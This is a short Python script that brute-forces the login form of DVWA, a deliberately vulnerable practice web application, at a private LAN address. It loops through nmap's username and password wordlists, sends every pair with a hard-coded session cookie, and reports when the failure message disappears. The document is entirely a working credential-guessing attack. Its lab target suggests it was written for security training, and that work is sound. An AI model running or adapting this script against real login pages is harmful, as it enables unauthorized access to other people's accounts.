import requests

username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
cookies = dict(security="low", PHPSESSID="47350feb3afbb699d169078913523194")


pwdFound = False
for user in user_list:
	user = user.rstrip()
	for pwd in pwd_list:
		pwd = pwd.rstrip()
		print (user,'',pwd)
		payload = {"username": user, "password": pwd, "Login":"Login"}
		response = requests.get("http://192.168.1.19/dvwa/vulnerabilities/brute/", params=payload, cookies=cookies)
		if "Username and/or password incorrect." in response.text:
			print("Invalid username and password")
		else:
			print("Combination found!!!")
			pwdFound = True
			break
	if pwdFound:
		break
